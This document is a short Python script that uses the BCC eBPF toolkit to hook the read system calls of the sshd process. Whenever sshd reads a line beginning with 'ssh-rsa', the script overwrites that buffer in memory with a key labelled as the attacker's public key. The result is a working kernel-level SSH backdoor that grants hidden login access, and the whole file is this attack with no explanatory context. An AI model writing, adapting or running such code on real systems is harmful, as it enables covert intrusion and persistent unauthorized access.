from bcc import BPF
import ctypes



b = BPF(text="""
BPF_HASH(fdmap);
struct syscall_read_logging
{
    long unsigned int buffer_addr;
    long int calling_size;
};
BPF_HASH(map_buff_addrs,  size_t,struct syscall_read_logging, 1024);
struct string_info {
    char str[600];
};

BPF_ARRAY(string_array, struct string_info, 10);
TRACEPOINT_PROBE(syscalls, sys_enter_read) {
    char comm[50];
    if(bpf_get_current_comm(&comm, 50)) {
        return 0;
    }
    const char *target_comm = "sshd";
    for (int i = 0; i < 5; i++)
    {
        if (comm[i] != target_comm[i])
        {
            return 0;
        }
    }
    struct syscall_read_logging data;
    long unsigned int buff_addr = args->buf;
    size_t size = args->count;
	size_t pid_tgid = bpf_get_current_pid_tgid();
    data.buffer_addr = buff_addr;
    data.calling_size = size;
    map_buff_addrs.update(&pid_tgid, &data);
    return 0;
}

TRACEPOINT_PROBE(syscalls, sys_exit_read) {
    char comm[50];
    if(bpf_get_current_comm(&comm, 50)) {
        return 0;
    }
	size_t pid_tgid = bpf_get_current_pid_tgid();
    const char *target_comm = "sshd";
    for (int i = 0; i < 5; i++)
    {
        if (comm[i] != target_comm[i])
        {
            return 0;
        }
    }
   	struct syscall_read_logging *data= map_buff_addrs.lookup(&pid_tgid);
    if (data == 0) return 0;
    long int te=data->calling_size;
    char* tmpbuf=(char*)data->buffer_addr;
    const char *becheck = "ssh-rsa";
        char str[7];
    bpf_probe_read(str,sizeof(str),(void *)tmpbuf);
    for (int i = 0; i < 7; i++)
    {
        if (becheck[i] != str[i])
        {
            return 0;
        }
    }
    int index = 0;
    struct string_info *info = string_array.lookup(&index);
    if (info==0) return 0;
    char *tobe=(char*)info->str;
    long ret = bpf_probe_write_user((void *)tmpbuf, tobe, 581); 
    bpf_trace_printk("tmpbuf:%s\\n", tmpbuf);
    //bpf_trace_printk("tobe:  %s\\n", tobe);
    return 0;
}
""")


# 获取string_array映射
string_array = b.get_table("string_array")

# 定义字符串
long_string = "ssh-rsa 攻击者公钥\n"


part = long_string
string_info = ctypes.create_string_buffer(part.encode())
string_array[ctypes.c_int(0)] = string_info
print("%-18s %-16s %-6s %s" % ("TIME(s)", "COMM", "PID", "message"))
while 1:
    try:
        (task, pid, cpu, flags, ts, msg) = b.trace_fields()
    except ValueError:
        continue
    print("%-18.9f %-16s %-6d %s" % (ts, task, pid, msg))
